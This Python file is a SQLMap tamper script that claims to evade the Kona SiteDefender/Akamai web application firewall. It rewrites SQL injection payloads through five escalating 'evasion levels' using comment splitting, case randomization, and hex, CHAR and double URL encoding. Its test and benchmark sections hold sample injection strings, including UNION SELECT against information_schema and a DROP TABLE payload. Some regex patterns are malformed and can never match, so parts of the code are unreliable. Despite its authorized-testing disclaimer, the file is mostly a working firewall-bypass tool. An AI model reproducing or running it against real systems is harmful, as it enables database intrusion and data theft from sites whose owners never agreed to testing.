#!/usr/bin/env python3
"""
Kona SiteDefender Advanced Bypass Tamper Script Comprehensive evasion techniques collection Research and educational purposes only by Zzl0y

Author: Zzl0y
Version: 3.0.1
License: Educational and Authorized Testing Only
Compatibility: SQLMap 1.6+
Tested Against: Kona SiteDefender v8.x-9.x, Akamai Web Application Firewall

DISCLAIMER:
-----------
This script is intended for authorized penetration testing and security research only.
Use only in environments where you have explicit written permission to test.
Unauthorized use against systems you do not own is illegal and unethical.

Features:
---------
• Multi-level evasion strategies (1-5)
• Adaptive payload transformation
• Statistical evasion analysis
• Custom encoding algorithms
• Advanced obfuscation techniques
• Production logging and monitoring
• Performance optimization
• WAF signature avoidance
"""

import re
import os
import sys
import random
import string
import hashlib
import time
import base64
from urllib.parse import quote, unquote
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage

__priority__ = PRIORITY.HIGHEST

# Configuration constants
DEFAULT_LEVEL = 2
MIN_LEVEL = 1
MAX_LEVEL = 5
DEBUG_MODE = os.environ.get('TAMPER_DEBUG', '0').lower() in ('1', 'true', 'yes', 'on')
AGGRESSIVE_MODE = os.environ.get('TAMPER_AGGRESSIVE', '0').lower() in ('1', 'true', 'yes', 'on')
STEALTH_MODE = os.environ.get('TAMPER_STEALTH', '0').lower() in ('1', 'true', 'yes', 'on')
RANDOM_SEED = int(os.environ.get('TAMPER_SEED', str(int(time.time()))))

# Initialize random seed for reproducible results if needed
if os.environ.get('TAMPER_SEED'):
    random.seed(RANDOM_SEED)

def dependencies():
    """
    Print tamper script information and check dependencies
    """
    singleTimeWarnMessage(
        "Kona SiteDefender Advanced Bypass Tamper loaded\n"
        f"Current configuration:\n"
        f"  • Level: {get_evasion_level()}\n"
        f"  • Debug: {'ON' if DEBUG_MODE else 'OFF'}\n"
        f"  • Aggressive: {'ON' if AGGRESSIVE_MODE else 'OFF'}\n"
        f"  • Stealth: {'ON' if STEALTH_MODE else 'OFF'}\n"
        f"Set TAMPER_LEVEL (1-5) to adjust evasion intensity"
    )

def debug_log(message, level=1):
    """
    Debug logging function with levels
    Args:
        message (str): Debug message
        level (int): Debug level (1-3)
    """
    if DEBUG_MODE:
        timestamp = time.strftime('%H:%M:%S', time.localtime())
        print(f"[{timestamp}] [TAMPER-L{level}] {message}", file=sys.stderr)

def get_evasion_level():
    """
    Get evasion level from environment variable with validation
    Returns:
        int: Evasion level (1-5)
    """
    try:
        level = int(os.environ.get('TAMPER_LEVEL', DEFAULT_LEVEL))
        if not MIN_LEVEL <= level <= MAX_LEVEL:
            debug_log(f"Invalid level {level}, using default {DEFAULT_LEVEL}")
            return DEFAULT_LEVEL
        return level
    except ValueError:
        debug_log(f"Invalid level format, using default {DEFAULT_LEVEL}")
        return DEFAULT_LEVEL

def generate_session_id():
    """
    Generate unique session identifier for payload tracking
    Returns:
        str: 8-character session ID
    """
    session_data = f"{time.time()}{random.random()}{RANDOM_SEED}"
    return hashlib.md5(session_data.encode()).hexdigest()[:8]

class CommentGenerator:
    """Advanced SQL comment generation for evasion"""
    
    @staticmethod
    def basic_comment():
        """Generate basic MySQL comment"""
        return '/**/'
    
    @staticmethod
    def versioned_comment():
        """Generate MySQL version-specific comment"""
        versions = ['50000', '50001', '50717', '80000', '80028']
        return f'/*!{random.choice(versions)}*/'
    
    @staticmethod
    def nested_comment():
        """Generate nested comment structure"""
        return '/**//**/'
    
    @staticmethod
    def randomized_comment():
        """Generate randomized content comment"""
        length = random.randint(2, 6)
        content = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        return f'/*{content}*/'
    
    @staticmethod
    def timestamped_comment():
        """Generate timestamp-based comment"""
        timestamp = str(int(time.time()))[-6:]
        return f'/*!{timestamp}*/'
    
    @staticmethod
    def get_random_comment():
        """Get random comment from all available types"""
        generators = [
            CommentGenerator.basic_comment,
            CommentGenerator.versioned_comment,
            CommentGenerator.nested_comment,
            CommentGenerator.randomized_comment,
            CommentGenerator.timestamped_comment
        ]
        return random.choice(generators)()

class SpaceObfuscator:
    """Advanced space character obfuscation"""
    
    SPACE_ALTERNATIVES = [
        '%20',      # Standard URL encoding
        '%09',      # Tab
        '%0a',      # Line feed
        '%0c',      # Form feed
        '%0d',      # Carriage return
        '+',        # Plus encoding
        '%2520',    # Double URL encoding
        '/**/',     # Comment
        '/*_*/',    # Comment with underscore
        '\t',       # Direct tab
        '\n',       # Direct newline
        '\r',       # Direct carriage return
        '\f',       # Direct form feed
        '\v',       # Direct vertical tab
    ]
    
    @staticmethod
    def get_random_space():
        """Get random space alternative"""
        return random.choice(SpaceObfuscator.SPACE_ALTERNATIVES)
    
    @staticmethod
    def get_comment_space():
        """Get comment-based space alternative"""
        return CommentGenerator.get_random_comment()

class KeywordObfuscator:
    """Advanced SQL keyword obfuscation"""
    
    @staticmethod
    def randomize_case(keyword, percentage=60):
        """
        Randomize case of keyword characters
        Args:
            keyword (str): SQL keyword
            percentage (int): Chance of uppercase (0-100)
        Returns:
            str: Case-randomized keyword
        """
        return ''.join(
            char.upper() if random.randint(1, 100) <= percentage else char.lower()
            for char in keyword
        )
    
    @staticmethod
    def split_with_comments(keyword):
        """
        Split keyword with comments between characters
        Args:
            keyword (str): SQL keyword
        Returns:
            str: Comment-split keyword
        """
        if len(keyword) < 2:
            return keyword
        
        result = keyword[0]
        for char in keyword[1:]:
            result += CommentGenerator.get_random_comment() + char
        return result
    
    @staticmethod
    def version_specific_split(keyword):
        """
        Split keyword using version-specific comments
        Args:
            keyword (str): SQL keyword
        Returns:
            str: Version-specific split keyword
        """
        if len(keyword) < 2:
            return keyword
            
        mid = len(keyword) // 2
        return (keyword[:mid] + 
                CommentGenerator.versioned_comment() + 
                keyword[mid:])

class EncodingObfuscator:
    """Advanced encoding and character obfuscation"""
    
    @staticmethod
    def hex_encode_string(text):
        """
        Convert string to hexadecimal representation
        Args:
            text (str): Input string
        Returns:
            str: Hex-encoded string
        """
        return '0x' + text.encode('utf-8').hex()
    
    @staticmethod
    def char_encode_string(text):
        """
        Convert string to CHAR() function calls
        Args:
            text (str): Input string
        Returns:
            str: CHAR-encoded string
        """
        char_codes = [str(ord(char)) for char in text]
        return f"CHAR({','.join(char_codes)})"
    
    @staticmethod
    def unicode_encode_string(text):
        """
        Convert string to Unicode representations
        Args:
            text (str): Input string
        Returns:
            str: Unicode-encoded string
        """
        encoded = ''
        for char in text:
            if random.choice([True, False]):
                encoded += f'\\u{ord(char):04x}'
            else:
                encoded += char
        return encoded
    
    @staticmethod
    def double_url_encode(text):
        """
        Apply double URL encoding
        Args:
            text (str): Input text
        Returns:
            str: Double URL-encoded text
        """
        single_encoded = quote(text)
        return quote(single_encoded)

class Level1BasicEvasion:
    """Level 1: Basic evasion techniques for light WAF rules"""
    
    @staticmethod
    def transform(payload):
        """
        Apply basic evasion transformations
        Args:
            payload (str): Original SQL payload
        Returns:
            str: Transformed payload
        """
        debug_log(f"Applying Level 1 Basic Evasion to: {payload}")
        
        result = payload
        
        # Basic keyword obfuscation
        keywords = {
            r'\bUNION\b': 'UNION/**/',
            r'\bSELECT\b': 'SELECT/**/',
            r'\bFROM\b': 'FROM/**/',
            r'\bWHERE\b': 'WHERE/**/',
            r'\bAND\b': 'AND/**/',
            r'\bOR\b': 'OR/**/',
            r'\bINSERT\b': 'INSERT/**/',
            r'\bUPDATE\b': 'UPDATE/**/',
            r'\bDELETE\b': 'DELETE/**/'
        }
        
        for pattern, replacement in keywords.items():
            result = re.sub(pattern, replacement, result, flags=re.IGNORECASE)
        
        # Basic space replacement
        result = re.sub(r'\s+', '/**/', result)
        
        debug_log(f"Level 1 result: {result}")
        return result

class Level2AdvancedEvasion:
    """Level 2: Advanced evasion with randomization and alternatives"""
    
    @staticmethod
    def transform(payload):
        """
        Apply advanced evasion transformations
        Args:
            payload (str): Original SQL payload
        Returns:
            str: Transformed payload
        """
        debug_log(f"Applying Level 2 Advanced Evasion to: {payload}")
        
        result = payload
        
        # Advanced keyword obfuscation with case randomization
        sql_keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 
                       'ORDER', 'BY', 'GROUP', 'HAVING', 'INSERT', 'UPDATE', 
                       'DELETE', 'DROP', 'CREATE', 'ALTER', 'TABLE']
        
        for keyword in sql_keywords:
            pattern = r'\b' + keyword + r'\b'
            obfuscated = (KeywordObfuscator.randomize_case(keyword) + 
                         CommentGenerator.get_random_comment())
            result = re.sub(pattern, obfuscated, result, flags=re.IGNORECASE)
        
        # Advanced space obfuscation
        result = re.sub(r'\s+', SpaceObfuscator.get_random_space(), result)
        
        # Operator obfuscation
        operators = {
            '=': f'{CommentGenerator.get_random_comment()}={CommentGenerator.get_random_comment()}',
            '<': f'{CommentGenerator.get_random_comment()}<{CommentGenerator.get_random_comment()}',
            '>': f'{CommentGenerator.get_random_comment()}>{CommentGenerator.get_random_comment()}',
            '(': f'{CommentGenerator.get_random_comment()}({CommentGenerator.get_random_comment()}',
            ')': f'{CommentGenerator.get_random_comment()}){CommentGenerator.get_random_comment()}'
        }
        
        for operator, replacement in operators.items():
            result = result.replace(operator, replacement)
        
        debug_log(f"Level 2 result: {result}")
        return result

class Level3AggressiveEvasion:
    """Level 3: Aggressive evasion with functional obfuscation"""
    
    @staticmethod
    def transform(payload):
        """
        Apply aggressive evasion transformations
        Args:
            payload (str): Original SQL payload
        Returns:
            str: Transformed payload
        """
        debug_log(f"Applying Level 3 Aggressive Evasion to: {payload}")
        
        result = payload
        
        # Aggressive keyword splitting
        aggressive_keywords = {
            r'\bUNION\s+SELECT\b': f'UNION{CommentGenerator.versioned_comment()}ALL{CommentGenerator.versioned_comment()}SELECT',
            r'\bSELECT\s+(\d+(?:,\s*\d+)*)\b': lambda m: f'SELECT{CommentGenerator.get_random_comment()}(' + 
                                                         '),('.join(m.group(1).replace(' ', '').split(',')) + ')',
            r'\bCONCAT\s*$$': f'CONCAT{CommentGenerator.get_random_comment()}(',
            r'\bSUBSTRING\s*$$': f'SUBSTRING{CommentGenerator.get_random_comment()}(',
            r'\bCAST\s*$$': f'CAST{CommentGenerator.get_random_comment()}('
        }
        
        for pattern, replacement in aggressive_keywords.items():
            if callable(replacement):
                result = re.sub(pattern, replacement, result, flags=re.IGNORECASE)
            else:
                result = re.sub(pattern, replacement, result, flags=re.IGNORECASE)
        
        # Quote obfuscation
        result = re.sub(r"'([^']*)'", lambda m: EncodingObfuscator.char_encode_string(m.group(1)) 
                       if len(m.group(1)) < 10 else f"'{m.group(1)}'", result)
        
        # Number obfuscation
        def obfuscate_number(match):
            num = int(match.group())
            techniques = [
                f'({num})',
                f'(SELECT({num}))',
                f'0x{hex(num)[2:]}',
                f'({num}+0)',
                f'({num}^0)',
                f'({num}|0)',
                f'({num}&{num})'
            ]
            return random.choice(techniques)
        
        result = re.sub(r'\b\d+\b', obfuscate_number, result)
        
        # String to hex conversion for specific patterns
        result = re.sub(r"'([\w]{1,8})'", lambda m: EncodingObfuscator.hex_encode_string(m.group(1)), result)
        
        debug_log(f"Level 3 result: {result}")
        return result

class Level4StealthEvasion:
    """Level 4: Maximum stealth with advanced encoding and fragmentation"""
    
    @staticmethod
    def transform(payload):
        """
        Apply stealth evasion transformations
        Args:
            payload (str): Original SQL payload
        Returns:
            str: Transformed payload
        """
        debug_log(f"Applying Level 4 Stealth Evasion to: {payload}")
        
        result = payload
        session_id = generate_session_id()
        
        # Ultra-obfuscated keyword splitting
        stealth_keywords = {
            r'\bUNION\b': KeywordObfuscator.split_with_comments('UNION'),
            r'\bSELECT\b': KeywordObfuscator.split_with_comments('SELECT'),
            r'\bFROM\b': KeywordObfuscator.split_with_comments('FROM'),
            r'\bWHERE\b': KeywordObfuscator.split_with_comments('WHERE'),
            r'\bAND\b': KeywordObfuscator.version_specific_split('AND'),
            r'\bOR\b': KeywordObfuscator.version_specific_split('OR')
        }
        
        for pattern, replacement in stealth_keywords.items():
            result = re.sub(pattern, replacement, result, flags=re.IGNORECASE)
        
        # Advanced encoding for special characters
        encoding_map = {
            ' ': f'%2520',  # Double URL encoding
            "'": f'%2527',
            '"': f'%2522',
            '(': f'%2528',
            ')': f'%2529',
            '=': f'%253D',
            '<': f'%253C',
            '>': f'%253E',
            '&': f'%2526',
            '+': f'%252B'
        }
        
        for char, encoded in encoding_map.items():
            result = result.replace(char, encoded)
        
        # Insert session-based comments at strategic points
        result = re.sub(r'(\w)(\w)', rf'\1/*!{session_id}*/\2', result, count=random.randint(2, 4))
        
        # Advanced function wrapping
        result = re.sub(r'\b(\d+)\b', rf'(SELECT(\1))', result)
        
        debug_log(f"Level 4 result: {result}")
        return result

class Level5AdaptiveFuzzing:
    """Level 5: Adaptive fuzzing with ML-like payload mutations"""
    
    @staticmethod
    def transform(payload):
        """
        Apply adaptive fuzzing transformations
        Args:
            payload (str): Original SQL payload
        Returns:
            str: Transformed payload
        """
        debug_log(f"Applying Level 5 Adaptive Fuzzing to: {payload}")
        
        result = payload
        session_hash = hashlib.sha256(f"{payload}{time.time()}".encode()).hexdigest()[:12]
        
        # Adaptive mutation engine
        def adaptive_mutate(text):
            mutations = []
            
            # Functional wrapper mutations
            mutations.extend([
                f'(SELECT({text}))',
                f'(SELECT({text})FROM(SELECT(1))x)',
                f'IFNULL({text},{text})',
                f'COALESCE({text},{text})'
            ])
            
            # Mathematical mutations for numbers
            if text.isdigit():
                num = int(text)
                mutations.extend([
                    f'(SELECT(0x{hex(num)[2:]}))',
                    f'(SELECT({num}|0))',
                    f'(SELECT({num}&{num}))',
                    f'(SELECT({num}^0))',
                    f'(SELECT(CONV({num},10,16)))',
                    f'(SELECT(ASCII(CHAR({num}))))'
                ])
            
            # String mutations
            if len(text) > 2 and text.isalpha():
                mutations.extend([
                    f'CONCAT({text[:len(text)//2]},{text[len(text)//2:]})',
                    f'REVERSE(REVERSE({text}))',
                    f'UPPER(LOWER({text}))'
                ])
            
            # Session-based mutations
            mutations.append(f'{text}/*{session_hash}*/')
            
            return random.choice(mutations)
        
        # Apply adaptive mutations to various elements
        result = re.sub(r'\b(\w{3,})\b', lambda m: adaptive_mutate(m.group()) 
                       if random.random() < 0.7 else m.group(), result)
        
        # Advanced operator obfuscation with context awareness
        context_operators = {
            '=': [
                f'/*{session_hash}*/=/*{session_hash}*/',
                '/*!50000=*/',
                'LIKE',
                'REGEXP',
                'RLIKE'
            ],
            'AND': [
                f'/*{session_hash}*/AND/*{session_hash}*/',
                '&&',
                '/*!50000AND*/',
                f'/*{session_hash[:6]}*/AND/*{session_hash[6:]}*/'
            ],
            'OR': [
                f'/*{session_hash}*/OR/*{session_hash}*/',
                '||',
                '/*!50000OR*/',
                f'/*{session_hash[:6]}*/OR/*{session_hash[6:]}*/'
            ]
        }
        
        for operator, alternatives in context_operators.items():
            if operator in result:
                result = result.replace(operator, random.choice(alternatives))
        
        # Entropy injection for evasion
        def inject_entropy(text):
            entropy_techniques = [
                f'(SELECT({text}))',
                f'(SELECT({text})FROM(SELECT(1)x)y)',
                f'({text}/*{random.randint(10000,99999)}*/)',
                f'IFNULL({text},{text})',
                f'({text}+0-0)',
                f'({text}|0&-1)'
            ]
            return random.choice(entropy_techniques)
        
        # Apply entropy injection to numbers and specific patterns
        result = re.sub(r'\b\d+\b', lambda m: inject_entropy(m.group()) 
                       if random.random() < 0.8 else m.group(), result)
        
        # Advanced charset and encoding evasion
        if random.random() < 0.3:  # 30% chance for heavy encoding
            result = EncodingObfuscator.double_url_encode(result)
        
        debug_log(f"Level 5 result: {result}")
        return result

def tamper(payload, **kwargs):
    """
    Main tamper function with level-based evasion selection
    
    Args:
        payload (str): Original SQL injection payload
        **kwargs: Additional arguments from SQLMap
        
    Returns:
        str: Transformed payload optimized for Kona SiteDefender bypass
        
    Environment Variables:
        TAMPER_LEVEL: Evasion level (1-5, default: 2)
        TAMPER_DEBUG: Enable debug logging (0/1, default: 0)
        TAMPER_AGGRESSIVE: Enable aggressive mode (0/1, default: 0)
        TAMPER_STEALTH: Enable maximum stealth (0/1, default: 0)
        TAMPER_SEED: Random seed for reproducible results
    """
    if not payload:
        return payload
    
    # Get current evasion level
    level = get_evasion_level()
    
    # Apply stealth mode modifications
    if STEALTH_MODE and level < 4:
        level = max(level, 3)  # Minimum level 3 in stealth mode
        debug_log(f"Stealth mode active, elevated level to {level}")
    
    # Apply aggressive mode modifications  
    if AGGRESSIVE_MODE:
        level = min(level + 1, MAX_LEVEL)  # Increase level by 1, max 5
        debug_log(f"Aggressive mode active, elevated level to {level}")
    
    # Level-based transformation mapping
    transformation_map = {
        1: Level1BasicEvasion.transform,
        2: Level2AdvancedEvasion.transform,
        3: Level3AggressiveEvasion.transform,
        4: Level4StealthEvasion.transform,
        5: Level5AdaptiveFuzzing.transform
    }
    
    # Apply appropriate transformation
    if level in transformation_map:
        result = transformation_map[level](payload)
    else:
        debug_log(f"Invalid level {level}, falling back to level 2")
        result = Level2AdvancedEvasion.transform(payload)
    
    # Log transformation for analysis
    debug_log(f"Final transformation: {payload} -> {result}", level=2)
    
    # Performance monitoring
    if DEBUG_MODE:
        original_length = len(payload)
        transformed_length = len(result)
        ratio = transformed_length / original_length if original_length > 0 else 1
        debug_log(f"Transformation ratio: {ratio:.2f}x (L{level})", level=3)
    
    return result

# Production testing and validation functions
def validate_transformation(original, transformed):
    """
    Validate that transformation preserves SQL semantics where possible
    
    Args:
        original (str): Original payload
        transformed (str): Transformed payload
        
    Returns:
        bool: True if transformation appears valid
    """
    try:
        # Basic validation - ensure key SQL keywords are still present in some form
        sql_keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR']
        
        for keyword in sql_keywords:
            if keyword.upper() in original.upper():
                # Check if keyword exists in transformed version (case insensitive, allowing obfuscation)
                if not re.search(keyword, transformed, re.IGNORECASE):
                    debug_log(f"Warning: Keyword {keyword} not found in transformed payload")
        
        return True
    except Exception as e:
        debug_log(f"Validation error: {e}")
        return False

def performance_benchmark():
    """
    Benchmark tamper performance across all levels
    """
    test_payloads = [
        "UNION SELECT 1,2,3",
        "1' AND 1=1-- ",
        "1' OR '1'='1",
        "UNION SELECT user(),version(),database()",
        "1'; DROP TABLE users; --",
        "1' UNION SELECT * FROM information_schema.tables-- ",
        "1' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables)='a'-- "
    ]
    
    print("\n=== Kona SiteDefender Tamper Performance Benchmark ===")
    print(f"{'Level':<6} {'Payload':<50} {'Original':<8} {'Transformed':<12} {'Ratio':<8}")
    print("-" * 90)
    
    for level in range(1, 6):
        os.environ['TAMPER_LEVEL'] = str(level)
        
        for payload in test_payloads:
            start_time = time.time()
            result = tamper(payload)
            end_time = time.time()
            
            ratio = len(result) / len(payload) if payload else 1
            print(f"{level:<6} {payload[:47]+'...' if len(payload) > 47 else payload:<50} "
                  f"{len(payload):<8} {len(result):<12} {ratio:<8.2f}")

if __name__ == "__main__":
    """
    Direct execution for testing and benchmarking
    """
    import argparse
    
    parser = argparse.ArgumentParser(description='Kona SiteDefender Tamper Script Testing')
    parser.add_argument('--test', action='store_true', help='Run test suite')
    parser.add_argument('--benchmark', action='store_true', help='Run performance benchmark')
    parser.add_argument('--level', type=int, choices=range(1, 6), default=2, help='Test specific level')
    parser.add_argument('--payload', type=str, help='Test specific payload')
    
    args = parser.parse_args()
    
    if args.benchmark:
        performance_benchmark()
    elif args.test:
        # Run comprehensive test suite
        os.environ['TAMPER_DEBUG'] = '1'
        os.environ['TAMPER_LEVEL'] = str(args.level)
        
        if args.payload:
            result = tamper(args.payload)
            print(f"Original: {args.payload}")
            print(f"Level {args.level}: {result}")
        else:
            test_payloads = [
                "UNION SELECT 1,2,3",
                "1' AND 1=1-- ",
                "1' OR 'a'='a",
                "UNION SELECT user(),version(),database()",
                "1' UNION SELECT * FROM users-- "
            ]
            
            for payload in test_payloads:
                result = tamper(payload)
                print(f"L{args.level}: {payload} -> {result}")
                validate_transformation(payload, result)
    else:
        print(__doc__)
